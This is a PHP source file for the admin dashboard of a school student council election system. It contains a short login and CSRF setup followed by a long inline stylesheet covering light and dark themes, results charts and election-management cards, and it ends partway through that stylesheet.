<?php
require_once __DIR__ . '/../includes/functions.php';
require_once __DIR__ . '/../config/db.php';

startSecureSession();
requireAdminLogin();

$csrfToken = csrfToken();
$adminUsername = $_SESSION['admin_username'] ?? 'Admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Aklan Catholic College student council election administration panel.">
<link rel="icon" href="../assets/favicon.png" type="image/png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700;800&family=Inter:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
<title>Admin Dashboard | School Elections</title>
<style>
:root{
    /* Tells the browser which UA color palette to use for NATIVE widget
       rendering (select dropdown popups, date-picker icons, number
       spinners, scrollbars, autofill). Without this, dark-theme text
       (white --ink) can be paired with a light system popup background
       → invisible white-on-white options. */
    color-scheme:light;
    --navy:#101828;
    --navy-2:#1d2939;
    --navy-3:#28374b;
    --lime:#84cc16;
    --lime-dark:#65a30d;
    --lime-soft:#f0fdf4;
    /* Landing-page brand fonts carried inward (9.5 batch) */
    --font-display:'Sora',system-ui,sans-serif;
    --font-mono:'IBM Plex Mono',ui-monospace,monospace;
    --bg:#f5f7fb;
    --ink:#0f172a;
    --muted:#64748b;
    --line:#e7ebf1;
    --line-strong:#dbe1ea;
    --border-soft:#f1f5f9;
    --surface:#ffffff;
    --surface-2:#f8fafc;
    --surface-hover:#f1f5f9;
    --input-bg:#ffffff;
    --overlay:rgba(15,23,42,.5);
    --card-shadow:0 1px 2px rgba(15,23,42,.04), 0 10px 24px -14px rgba(15,23,42,.12);
    --card-shadow-hover:0 4px 10px rgba(15,23,42,.05), 0 18px 34px -16px rgba(15,23,42,.16);
    --radius-lg:18px;
    --radius-md:14px;
    --radius-sm:10px;
    --blue:#3b82f6;
    --purple:#8b5cf6;
    --amber:#f59e0b;
    --teal:#14b8a6;
    --danger:#dc2626;
    /* The admin panel inlines its own stylesheet and does NOT load
       assets/dashboard-app.css (that's the student dashboard). Results
       markup uses the student token names, which resolve to nothing here and
       silently fall back to the browser's initial values — invisible text on
       a dark card. These aliases map the shared names onto the admin panel's
       own tokens so both themes render correctly. */
    --text:var(--ink);
    --text-secondary:var(--muted);
    --border:var(--line);
    --border-strong:var(--line-strong);
    --card:var(--surface);
    --card-2:var(--surface-2);
    --accent:var(--lime);
    --accent-dark:var(--lime-dark);
    --warning:var(--amber);
}
/* ================= DARK THEME ================= */
/* Toggled via [data-theme="dark"] on <html> — see the theme switcher in
   the sidebar. Sidebar itself stays the same dark navy in both modes
   (it's already dark), so only the main content surface tokens change. */
[data-theme="dark"]{
    /* Native widgets (dropdown popups, pickers, spinners, scrollbars)
       must render with the dark UA palette to match the theme above. */
    color-scheme:dark;
    --bg:#0a1120;
    --ink:#e7ecf5;
    --muted:#8b98ad;
    --line:#232f45;
    --line-strong:#2c3a55;
    --border-soft:#1c2739;
    --surface:#111a2c;
    --surface-2:#0f1726;
    --surface-hover:#182238;
    --input-bg:#0f1726;
    --overlay:rgba(0,0,0,.65);
    --card-shadow:0 1px 2px rgba(0,0,0,.3), 0 10px 24px -14px rgba(0,0,0,.55);
    --card-shadow-hover:0 4px 12px rgba(0,0,0,.4), 0 18px 34px -16px rgba(0,0,0,.65);
    --lime-soft:rgba(132,204,22,.12);
    --danger:#f87171;
}

/* ================= RESULTS PANEL (Overview / Detail / Reports) =====
   These rules live here, not in assets/dashboard-app.css, because the admin
   panel inlines its own stylesheet and never loads that file (it belongs to
   the student dashboard). They were previously defined only in the student
   stylesheet, so every one of them resolved to nothing inside the admin panel
   — which is why the stat tiles rendered as unstyled stacked text and the
   report headings were invisible on the dark card.

   All colours go through the admin panel's own tokens (--surface, --ink,
   --muted, --line, --lime, --amber...), so both themes are handled by
   swapping the token values above rather than by duplicate dark-mode rules. */
.stat-strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:1rem;margin-bottom:1.5rem;}
.stat-tile{
    background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--line-strong);
    border-radius:10px;padding:.95rem 1.1rem 1rem;box-shadow:var(--card-shadow);
    display:flex;flex-direction:column;min-width:0;
}
/* The rail colour encodes meaning: lime = healthy, amber = needs attention,
   slate = nothing to act on yet. */
.stat-tile.tone-good{border-left-color:var(--lime-dark);}
.stat-tile.tone-warn{border-left-color:var(--amber);}
.stat-tile.tone-neutral{border-left-color:var(--line-strong);}
.stat-tile .k{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);font-family:var(--font-mono);}
.stat-tile .v{font-size:1.9rem;font-weight:800;color:var(--ink);line-height:1.1;letter-spacing:-.02em;margin:.15rem 0 .2rem;font-family:var(--font-display);}
.stat-tile .s{font-size:.78rem;color:var(--muted);line-height:1.45;}
.stat-tile .hint{font-size:.72rem;color:var(--muted);margin-top:.5rem;padding-top:.5rem;border-top:1px dashed var(--line);line-height:1.45;}

/* Per-election summary — the "outside" view. */
.ov-table{width:100%;border-collapse:collapse;}
.ov-table th{text-align:left;font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);padding:0 .75rem .55rem;border-bottom:1px solid var(--line);white-space:nowrap;}
.ov-table td{padding:.7rem .75rem;border-bottom:1px solid var(--line);font-size:.86rem;color:var(--ink);vertical-align:middle;}
.ov-table tr:last-child td{border-bottom:none;}
.ov-table .num{text-align:right;font-variant-numeric:tabular-nums;white-space:nowrap;}
.ov-table .ov-name{font-weight:600;}
.ov-table .ov-sub{display:block;font-size:.74rem;color:var(--muted);margin-top:.15rem;}

/* Turnout meter — a fixed-width track so elections are comparable at a glance. */
.meter{display:flex;align-items:center;gap:.55rem;min-width:140px;}
.meter-track{flex:1;height:7px;min-width:64px;background:var(--surface-2);border-radius:999px;overflow:hidden;border:1px solid var(--line);}
.meter-fill{height:100%;background:var(--lime-dark);border-radius:999px;}
.meter-fill.low{background:var(--amber);}
.meter-fill.none{background:var(--line-strong);}
.meter-label{font-size:.8rem;font-weight:700;color:var(--ink);font-variant-numeric:tabular-nums;min-width:46px;text-align:right;}

/* "Needs your attention" */
.ov-flags{display:flex;flex-direction:column;gap:.55rem;}
.ov-flag{display:flex;align-items:flex-start;gap:.6rem;padding:.65rem .85rem;border-radius:8px;background:var(--surface-2);border:1px solid var(--line);border-left-width:3px;font-size:.85rem;line-height:1.5;color:var(--ink);}
.ov-flag .flag-icon{flex-shrink:0;line-height:1.4;}
.ov-flag.warn{border-left-color:var(--amber);}
.ov-flag.info{border-left-color:var(--line-strong);}
.ov-flag.good{border-left-color:var(--lime-dark);}

/* Chart containers */
.chart-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:1.25rem;}
.chart-grid .span-full{grid-column:1 / -1;}
.chart-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.1rem 1.25rem 1.25rem;box-shadow:var(--card-shadow);display:flex;flex-direction:column;min-width:0;}
.chart-card-head{display:flex;align-items:baseline;justify-content:space-between;gap:.75rem;margin-bottom:.2rem;flex-wrap:wrap;}
.chart-card-title{font-size:.95rem;font-weight:800;color:var(--ink);margin:0;}
.chart-card-sub{font-size:.76rem;color:var(--muted);margin:0 0 .9rem;line-height:1.5;}
.chart-box{position:relative;height:260px;min-width:0;}
.chart-box.tall{height:340px;}
.chart-empty{display:flex;align-items:center;justify-content:center;height:100%;min-height:120px;text-align:center;color:var(--muted);font-size:.85rem;padding:1rem;}
/* Lives OUTSIDE .chart-box on purpose: the box has a fixed height, so
   anything inserted after the canvas would overflow the card. */
.chart-legend-note{font-size:.72rem;color:var(--muted);margin:.75rem 0 0;line-height:1.5;}
.chip-legend{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:.8rem;}
.chip-legend .chip{display:inline-flex;align-items:center;gap:.35rem;font-size:.74rem;color:var(--muted);background:var(--surface-2);border:1px solid var(--line);padding:.22rem .55rem;border-radius:999px;}
.chip-legend .swatch{width:10px;height:10px;border-radius:3px;flex-shrink:0;}

/* Report preview rows — the heading previously used var(--navy) via inline
   styles; it now comes from the token set above. */
/* Reports preview. The section heading previously carried an inline
   color:var(--navy). --navy is #101828 — near-black — so on the dark card in
   dark mode the election name (e.g. "Engineering — Department Student
   Government") was invisible. Colour now comes from a token that is
   redefined per theme, stated explicitly rather than left to inheritance. */
.report-preview h4{margin:0 0 .5rem;font-size:.95rem;color:var(--ink);border-bottom:1px solid var(--line);padding-bottom:.45rem;}
.report-row{display:flex;justify-content:space-between;gap:1rem;padding:.6rem 0;border-bottom:1px solid var(--border);}
.report-row:last-child{border-bottom:none;}
.report-row .pos{font-weight:600;color:var(--ink);}
.report-row .who{text-align:right;color:var(--ink);}
.report-row .who-none{color:var(--muted);font-style:italic;}
/* "Reports & Export" lives outside the pill group, right-aligned; a darker
   shade marks it active while its view is open. */
.reports-btn-active{background:var(--accent-dark);border-color:var(--accent-dark);}
/* Report section picker (select + reorder before export) and the shared
   press-hold drag handle used by the picker rows AND the wizard position
   table. touch-action:none is what lets a finger drag rows instead of
   scrolling the page. */
.report-section-row{display:flex;align-items:center;gap:.6rem;padding:.5rem .65rem;border:1px solid var(--line);border-radius:8px;margin-bottom:.45rem;background:var(--input-bg);font-size:.88rem;}
.report-section-row input[type="checkbox"]{width:16px;height:16px;flex:0 0 auto;}
.drag-handle{cursor:grab;touch-action:none;user-select:none;-webkit-user-select:none;color:var(--muted);padding:0 .35rem;font-size:1rem;flex:0 0 auto;}
.drag-handle:active{cursor:grabbing;}
/* Grabbed row: lifted over its siblings while it follows the pointer
   (the transform comes from JS so the row stays glued to the cursor). */
.row-dragging{ position: relative; z-index: 60; box-shadow: 0 16px 30px -10px rgba(15,23,42,.4); will-change: transform; }
.report-section-row.row-dragging{ background: var(--card); border-color: var(--accent); }
#positionsTable tr.row-dragging td{ background: var(--input-bg); box-shadow: 0 16px 30px -10px rgba(15,23,42,.35); }
/* Landing flash after the drop (settle), on div rows and table rows. */
@keyframes rowSettle{ from{ background-color: rgba(132,204,22,.18); } to{ background-color: transparent; } }
.row-settle{ animation: rowSettle .5s ease; }
#positionsTable tr.row-settle td{ animation: rowSettle .5s ease; }

*{box-sizing:border-box;}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,Roboto,sans-serif;background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased;}

/* ================= SHELL / SIDEBAR ================= */
#appShell{display:flex;min-height:100vh;}
.sidebar{
    width:248px;background:linear-gradient(180deg,var(--navy) 0%,#0b1220 100%);color:#cbd5e1;display:flex;flex-direction:column;
    position:fixed;top:0;left:0;bottom:0;z-index:1000;transition:transform .3s ease;overflow:hidden;
}
.sidebar .logo-area{padding:1.75rem 1.5rem 1.25rem;text-align:center;flex-shrink:0;}
.sidebar .logo-area .badge img{max-width:84px;height:auto;filter:drop-shadow(0 4px 10px rgba(0,0,0,.3));}
.sidebar .logo-area h2{color:#fff;margin:.75rem 0 0;font-weight:600;font-size:1rem;letter-spacing:-.01em;}
.sidebar .logo-area .tag{color:#64748b;font-size:.68rem;letter-spacing:.08em;text-transform:uppercase;margin-top:.15rem;}
.sidebar nav{flex:1;overflow-y:auto;padding:.75rem .75rem;}
.sidebar nav a{
    display:flex;align-items:center;gap:.75rem;padding:.65rem .85rem;margin-bottom:.15rem;color:#94a3b8;text-decoration:none;
    border-radius:10px;transition:background .15s,color .15s;cursor:pointer;font-size:.88rem;font-weight:500;
}
.sidebar nav a .ic,.sidebar nav a .nav-icon{width:18px;height:18px;flex-shrink:0;display:inline-flex;align-items:center;justify-content:center;}
.nav-icon svg{width:100%;height:100%;}
.logout-link .nav-icon{width:18px;height:18px;flex-shrink:0;display:inline-flex;}
.logout-link .nav-icon svg{width:100%;height:100%;}
.sidebar nav a:hover{background:rgba(255,255,255,.06);color:#e2e8f0;}
.sidebar nav a.active{background:var(--lime);color:#052e16;font-weight:700;}
.sidebar nav a.active .nav-icon{color:#052e16;}
.sidebar nav a.disabled{opacity:.4;cursor:not-allowed;}
.sidebar nav a.disabled:hover{background:transparent;color:#94a3b8;}
.sidebar .profile-section{
    padding:1rem 1.25rem;border-top:1px solid rgba(255,255,255,.08);display:flex;align-items:center;gap:.75rem;
    flex-shrink:0;background:transparent;
}
.sidebar .profile-section .avatar{
    width:38px;height:38px;border-radius:11px;background:var(--navy-3);color:#e2e8f0;border:1px solid rgba(255,255,255,.08);
    display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.95rem;flex-shrink:0;
}
.sidebar .profile-section .user-info{flex:1;overflow:hidden;}
.sidebar .profile-section .user-info .name{font-weight:600;color:#fff;font-size:.88rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.sidebar .profile-section .user-info .role{font-size:.72rem;color:#64748b;}
.sidebar .logout-link{padding:.5rem .75rem .75rem;border-top:1px solid rgba(255,255,255,.08);flex-shrink:0;background:transparent;}
.sidebar .logout-link a{display:flex;align-items:center;gap:.75rem;padding:.65rem .85rem;color:#f87171;text-decoration:none;cursor:pointer;font-size:.88rem;font-weight:500;border-radius:10px;transition:background .15s;}
.sidebar .logout-link a:hover{background:rgba(248,113,113,.12);text-decoration:none;}
.sidebar .logout-link a .nav-icon{width:18px;height:18px;}

.main-content{margin-left:248px;flex:1;padding:2rem 2.25rem;transition:margin-left .3s;min-width:0;}
.page-header{
    display:flex;justify-content:space-between;align-items:center;margin-bottom:1.75rem;padding-bottom:1.1rem;
    border-bottom:1px solid var(--line);flex-wrap:wrap;gap:.5rem;position:sticky;top:0;background:var(--bg);
    z-index:500;padding-top:.25rem;
}
.page-header h1{margin:0;font-weight:700;color:var(--ink);font-size:1.5rem;letter-spacing:-.01em;}
.page-header .date{font-size:.85rem;color:var(--muted);}
.hamburger{display:none;background:none;border:none;font-size:1.8rem;color:var(--ink);cursor:pointer;padding:.25rem .5rem;line-height:1;}
.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:999;opacity:0;transition:opacity .3s;}
.sidebar-overlay.active{display:block;opacity:1;}

.panel{display:none;}
.panel.active{display:block;}

/* ================= SHARED COMPONENTS ================= */
.stats-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1rem;margin-bottom:2rem;}
.stat-box{background:var(--surface);border-radius:var(--radius-md);padding:1.1rem 1.25rem;box-shadow:var(--card-shadow);border:1px solid var(--line);display:flex;flex-direction:column;gap:.6rem;text-align:left;}
.stat-box .stat-icon{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.stat-box .stat-icon svg{width:18px;height:18px;}
.stat-box .stat-number{font-size:1.85rem;font-weight:800;color:var(--ink);letter-spacing:-.02em;line-height:1;}
.stat-box .stat-label{font-size:.8rem;color:var(--muted);font-weight:500;}
.section-title{font-size:1.15rem;font-weight:700;color:var(--ink);margin:0 0 1rem;letter-spacing:-.01em;font-family:var(--font-display);}
.card{background:var(--surface);border-radius:var(--radius-md);box-shadow:var(--card-shadow);border:1px solid var(--line);padding:1.5rem;}
.grid-2{display:grid;grid-template-columns:1.3fr 1fr;gap:1.25rem;}
@media (max-width:1000px){.grid-2{grid-template-columns:1fr;}}
.muted{color:var(--muted);}
.btn{
    box-sizing:border-box;height:42px;display:inline-flex;align-items:center;justify-content:center;gap:.4rem;
    border-radius:10px;font-weight:600;font-size:.85rem;font-family:inherit;padding:0 1.1rem;
    transition:background .15s,border-color .15s,transform .1s,box-shadow .15s;border:1.5px solid transparent;
    text-decoration:none;cursor:pointer;white-space:nowrap;
}
.btn:active{transform:scale(.98);}
.btn-primary{background:var(--lime);color:#0a2e0a;border-color:var(--lime);box-shadow:0 2px 8px -2px rgba(132,204,22,.5);}
.btn-primary:hover{background:var(--lime-dark);border-color:var(--lime-dark);color:#fff;}
.btn-primary:disabled{opacity:.5;cursor:not-allowed;box-shadow:none;}
.btn-secondary{background:var(--surface);color:var(--ink);border-color:var(--line-strong);}
.btn-secondary:hover{background:var(--surface-hover);border-color:#94a3b8;}
.btn-danger{background:var(--surface);color:#dc2626;border-color:#fecaca;}
.btn-spinner{display:inline-block;width:14px;height:14px;border-radius:50%;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;animation:btnSpin .7s linear infinite;flex-shrink:0;margin-right:.4rem;vertical-align:-2px;}
.btn-spinner.dark{border-color:rgba(15,23,42,.25);border-top-color:var(--ink);}
@keyframes btnSpin{to{transform:rotate(360deg);}}
.btn-danger:hover{background:rgba(220,38,38,.1);border-color:#f87171;}
.btn-navy{background:var(--navy);color:#fff;border-color:var(--navy);}
.btn-navy:hover{background:var(--navy-2);}
.btn-sm{height:34px;font-size:.78rem;padding:0 .8rem;}
.btn-block{width:100%;}
.pill-toggle{display:flex;gap:.5rem;flex-wrap:wrap;}
.pill-toggle button{
    border:1.5px solid var(--line-strong);background:var(--surface);color:var(--muted);padding:.4rem .85rem;border-radius:999px;
    font-size:.78rem;font-weight:600;cursor:pointer;transition:.15s;
}
.pill-toggle button.selected{background:var(--navy);color:#fff;border-color:var(--navy);}
/* Segmented view switch - for pairs that SWITCH THE VIEW of the same
   content (Results: Overview / Election Detail), unlike pill-toggle's
   loose pills which read as sort/filter actions (Elections statuses). */
.view-switch{display:inline-flex;gap:.2rem;background:var(--surface-2);border:1px solid var(--line);border-radius:10px;padding:.22rem;}
.view-switch button{
    border:1px solid transparent;background:transparent;color:var(--muted);padding:.42rem 1.1rem;border-radius:8px;
    font-size:.78rem;font-weight:600;cursor:pointer;transition:.15s;white-space:nowrap;
}
.view-switch button:hover{color:var(--ink);}
.view-switch button.selected{background:var(--navy);color:#fff;box-shadow:0 1px 3px rgba(16,24,40,.18);}
/* Dark mode: navy #101828 sits on the near-black track and disappears -
   the selected segment becomes a visibly raised navy-2 slab instead. */
[data-theme="dark"] .view-switch button.selected{background:var(--navy-2);color:#fff;box-shadow:0 1px 4px rgba(0,0,0,.45);border:1px solid var(--line-strong);}
.alert{padding:.9rem 1rem;border-radius:var(--radius-sm);margin-bottom:1rem;font-size:.9rem;display:flex;align-items:flex-start;gap:.6rem;}
.alert-success{background:#ecfdf3;color:#065f46;border:1px solid #d1fae5;}
.alert-error{background:#fef2f2;color:#991b1b;border:1px solid #fee2e2;}
.alert-info{background:#eff6ff;color:#1e40af;border:1px solid #dbeafe;}
.alert-warning{background:#fffbeb;color:#92400e;border:1px solid #fde68a;}
.progress-bar-track{background:#eef1f6;border-radius:20px;height:8px;overflow:hidden;margin-top:.3rem;}
.progress-bar-fill{background:linear-gradient(90deg,var(--lime-dark),var(--lime));height:100%;border-radius:20px;transition:width .4s ease;}

.status-large{display:inline-flex;align-items:center;gap:.5rem;font-size:.75rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:#15803d;background:rgba(34,197,94,.12);padding:.4rem .85rem .4rem .7rem;border-radius:999px;line-height:1;}
.status-large .status-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;flex-shrink:0;}
.status-large.closed{color:#b91c1c;background:rgba(239,68,68,.1);}
.status-large.closed .status-dot{background:#ef4444;}
.status-large.paused{color:#92400e;background:rgba(245,158,11,.15);}
.status-large.paused .status-dot{background:#f59e0b;}
.status-large.scheduled{color:#3730a3;background:rgba(99,102,241,.12);}
.status-large.scheduled .status-dot{background:#6366f1;}
.status-large.draft{color:#475569;background:rgba(100,116,139,.14);}
.status-large.draft .status-dot{background:#64748b;}

/* ================= DASHBOARD PANEL ================= */
.dept-row{display:flex;align-items:center;gap:1rem;padding:.7rem 0;border-bottom:1px solid var(--border-soft);}
.dept-row:last-child{border-bottom:none;}
.dept-row .dept-name{width:70px;flex-shrink:0;font-weight:600;font-size:.85rem;}
.dept-row .dept-bar{flex:1;}
.dept-row .dept-nums{width:150px;flex-shrink:0;text-align:right;font-size:.78rem;color:var(--muted);}
.donut-wrap{display:flex;align-items:center;justify-content:center;gap:1.5rem;flex-wrap:wrap;}
.donut-legend{display:flex;flex-direction:column;gap:.5rem;font-size:.85rem;}
.donut-legend .lg-item{display:flex;align-items:center;gap:.5rem;}
.donut-legend .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;}
.insight-list{margin:0;padding-left:1.1rem;font-size:.87rem;color:var(--ink);line-height:1.7;}

.log-item{display:flex;gap:.75rem;padding:.6rem 0;border-bottom:1px solid var(--border-soft);font-size:.85rem;}
.log-item:last-child{border-bottom:none;}
.log-item .log-time{color:var(--muted);white-space:nowrap;font-variant-numeric:tabular-nums;flex-shrink:0;}
.log-item .log-text{color:var(--ink);}
.panel-flex-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;}

.rm-head{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:.75rem;margin-bottom:.5rem;}
.results-mini{border-bottom:1px solid var(--border-soft);padding-bottom:1rem;margin-bottom:1rem;}
.results-mini:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
.results-mini .rm-title{font-weight:600;font-size:.92rem;}
.results-block .rm-head .btn{flex-shrink:0;}

/* ================= ELECTION PANEL — CARDS ================= */
.election-cards{display:flex;flex-direction:column;gap:1.25rem;}
.election-card{background:var(--surface);border-radius:var(--radius-lg);border:1px solid var(--line);box-shadow:var(--card-shadow);padding:1.6rem 1.75rem;border-top:3px solid var(--lime);display:flex;flex-direction:column;gap:1rem;transition:box-shadow .2s;}
.election-card:hover{box-shadow:var(--card-shadow-hover);}
/* Left-edge accent color echoes the status badge, so a card reads its
   status at a glance even before you get to the badge text — and ties
   visually back to its group header below. */
.election-card.status-ongoing{border-top-color:#22c55e;}
.election-card.status-paused{border-top-color:#f59e0b;}
.election-card.status-scheduled{border-top-color:#6366f1;}
.election-card.status-draft{border-top-color:#94a3b8;}
.election-card.status-closed{border-top-color:#ef4444;}

/* Status group headers — elections are grouped (Ongoing / Paused /
   Upcoming / Drafts / Ended) instead of listed in raw, unordered API
   order, so a mixed list doesn't read as random clutter. */
.election-group-header{display:flex;align-items:center;gap:.55rem;margin:1.9rem 0 .85rem;}
.election-group-header:first-of-type{margin-top:.25rem;}
.election-group-header .dot{width:9px;height:9px;border-radius:50%;flex-shrink:0;}
.election-group-header .dot.ongoing{background:#22c55e;}
.election-group-header .dot.paused{background:#f59e0b;}
.election-group-header .dot.scheduled{background:#6366f1;}
.election-group-header .dot.draft{background:#94a3b8;}
.election-group-header .dot.closed{background:#ef4444;}
.election-group-header .label{font-size:.78rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);}
.election-group-header .count{background:var(--surface-2);color:var(--muted);padding:.1rem .55rem;border-radius:999px;font-size:.72rem;font-weight:700;}
.election-group-header::after{content:'';flex:1;height:1px;background:var(--line);}

/* Status filter pills at the top of Election Management */
.election-filter-bar{display:flex;flex-wrap:wrap;gap:.5rem;margin-bottom:1.5rem;}
.election-filter-bar button{
    border:1.5px solid var(--line-strong);background:var(--surface);color:var(--muted);padding:.45rem .95rem;border-radius:999px;
    font-size:.8rem;font-weight:600;cursor:pointer;transition:.15s;display:inline-flex;align-items:center;gap:.4rem;
}
.election-filter-bar button .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.election-filter-bar button.selected{background:var(--navy);color:#fff;border-color:var(--navy);}
.election-filter-bar button .fbadge{background:rgba(15,23,42,.06);padding:.05rem .4rem;border-radius:999px;font-size:.7rem;}
.election-filter-bar button.selected .fbadge{background:rgba(255,255,255,.18);}

/* ================= ELECTION LOGOS (SSG site logo + per-department DSG) ================= */
/* Same badge treatment everywhere an election's type/department needs a
   visual identity: an image if one's been uploaded, else the generic
   placeholder glyph (see defaultElectionLogoSvg() in includes/functions.php
   / ELOGO_PLACEHOLDER_SVG below), which uses currentColor so it reads
   correctly in both light and dark mode without a separate asset. */
.election-logo-badge{
    width:44px;height:44px;border-radius:50%;background:var(--surface-2);border:1px solid var(--line);
    display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden;
}
.election-logo-badge .elogo-img{width:100%;height:100%;object-fit:cover;background:#fff;}
.election-logo-badge .elogo-placeholder{width:55%;height:55%;color:var(--muted);}
.logo-upload-row{display:flex;align-items:center;gap:1rem;flex-wrap:wrap;}
.logo-upload-row .election-logo-badge{width:64px;height:64px;}
.settings-row .election-logo-badge{width:38px;height:38px;}

.card-top-row{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.6rem;}
.remaining-time{display:inline-flex;align-items:baseline;gap:.4rem;font-size:.82rem;color:var(--muted);background:var(--surface-2);padding:.4rem .8rem;border-radius:999px;white-space:nowrap;}
.remaining-time strong{color:var(--ink);font-weight:600;font-size:.78rem;}
.remaining-time span{color:var(--ink);font-weight:700;font-variant-numeric:tabular-nums;}
.election-title{font-size:1.3rem;font-weight:700;color:var(--ink);margin:0;}
.election-sub{font-size:.82rem;color:var(--muted);margin-top:0.2rem;}
.sy-badge{display:inline-flex;align-items:center;gap:.35rem;font-size:.72rem;font-weight:700;color:#92400e;background:#fef3c7;padding:.3rem .7rem;border-radius:999px;white-space:nowrap;}
[data-theme="dark"] .sy-badge{color:#fbbf24;background:rgba(245,158,11,.16);}
.schedule-box{background:var(--surface-2);border-radius:12px;padding:1rem 1.1rem;display:flex;flex-wrap:wrap;gap:1rem;align-items:flex-end;}
.schedule-field{display:flex;flex-direction:column;gap:.3rem;}
.schedule-field label{font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.03em;color:var(--muted);}
.schedule-field input{padding:.45rem .6rem;border:1px solid var(--line);border-radius:8px;font-size:.85rem;background:var(--input-bg);color:var(--ink);}
.schedule-field input:disabled{background:var(--surface-2);color:var(--muted);}
.card-actions{display:flex;flex-wrap:wrap;gap:.6rem;align-items:center;}
.card-actions .btn{flex:0 0 auto;}
.action-group-primary{display:flex;flex-wrap:wrap;gap:.6rem;flex:1 1 auto;}
.action-group-secondary{display:flex;flex-wrap:wrap;gap:.6rem;margin-left:auto;}
.turnout-line{font-size:.82rem;color:var(--muted);}

/* ================= CREATE ELECTION WIZARD ================= */
.wizard-topbar{display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem;}
.wizard-topbar .back-btn{background:none;border:none;color:var(--ink);font-weight:600;cursor:pointer;display:flex;align-items:center;gap:.3rem;font-size:.9rem;padding:.3rem 0;}
.wizard-topbar .back-btn:hover{color:var(--lime-dark);}
.type-choice-row{display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;margin-bottom:1.5rem;}
@media (max-width:700px){.type-choice-row{grid-template-columns:1fr;}}
.type-choice{
    border:2px solid var(--line);border-radius:16px;padding:1.5rem;text-align:center;cursor:pointer;background:var(--surface);
    transition:.15s;
}
.type-choice:hover{border-color:#bbf7d0;}
.type-choice.selected{border-color:var(--lime);background:#f7fee7;}
.type-choice .tc-icon{font-size:2rem;margin-bottom:.5rem;}
.type-choice h3{margin:.2rem 0;color:var(--ink);}
.type-choice p{color:var(--muted);font-size:.85rem;margin:0;}

.wizard-section{background:var(--surface);border-radius:var(--radius-md);box-shadow:var(--card-shadow);border:1px solid var(--line);padding:1.5rem;margin-bottom:1.25rem;}
.wizard-section h3{margin:0 0 1rem;font-size:1.05rem;color:var(--ink);}
.form-row{display:flex;flex-direction:column;gap:.35rem;margin-bottom:1rem;}
.form-row label{font-size:.82rem;font-weight:600;color:var(--ink);}
.form-row input[type=text], .form-row input[type=number], .form-row input[type=password], .form-row select, .form-row textarea{
    padding:.6rem .75rem;border:1px solid var(--line);border-radius:8px;font-size:.88rem;font-family:inherit;background:var(--input-bg);color:var(--ink);
}
.form-row textarea{resize:vertical;min-height:70px;}
.two-col{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
@media (max-width:640px){.two-col{grid-template-columns:1fr;}}

.toggle-switch{display:inline-flex;align-items:center;gap:.6rem;cursor:pointer;user-select:none;}
.toggle-switch .track{width:42px;height:24px;border-radius:999px;background:#cbd5e1;position:relative;transition:.2s;flex-shrink:0;}
.toggle-switch .track::after{content:'';position:absolute;top:3px;left:3px;width:18px;height:18px;border-radius:50%;background:#fff;transition:.2s;}
.toggle-switch.on .track{background:var(--lime);}
.toggle-switch.on .track::after{left:21px;}

.party-input-list{display:flex;flex-direction:column;gap:.6rem;margin-top:.75rem;}
.party-input-list input{padding:.55rem .7rem;border:1px solid var(--line);border-radius:8px;font-size:.85rem;background:var(--input-bg);color:var(--ink);}

table.pos-table{width:100%;border-collapse:collapse;margin-top:1rem;font-size:.85rem;}
table.pos-table th{text-align:left;color:var(--muted);font-size:.72rem;text-transform:uppercase;letter-spacing:.03em;padding:.5rem .4rem;border-bottom:2px solid var(--line);}
table.pos-table td{padding:.5rem .4rem;border-bottom:1px solid var(--border-soft);vertical-align:middle;}
table.pos-table input, table.pos-table select{width:100%;padding:.4rem .5rem;border:1px solid var(--line);border-radius:6px;font-size:.83rem;background:var(--input-bg);color:var(--ink);}

.candidate-block{border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.25rem;margin-bottom:1rem;background:var(--surface-2);}
.candidate-block h4{margin:0 0 .8rem;font-size:.95rem;color:var(--ink);}
.candidate-photo-row{display:flex;gap:1rem;align-items:center;margin-bottom:.9rem;}
.candidate-photo-row img{width:64px;height:64px;border-radius:50%;object-fit:cover;background:#e2e8f0;border:2px solid #fff;box-shadow:0 1px 4px rgba(0,0,0,.1);}
.position-group-title{font-weight:700;color:var(--navy);margin:1.5rem 0 .75rem;font-size:1rem;}
.position-group-title:first-child{margin-top:0;}

.wizard-footer{display:flex;justify-content:space-between;gap:1rem;margin-top:1.5rem;}

/* ================= RESULTS PANEL ================= */
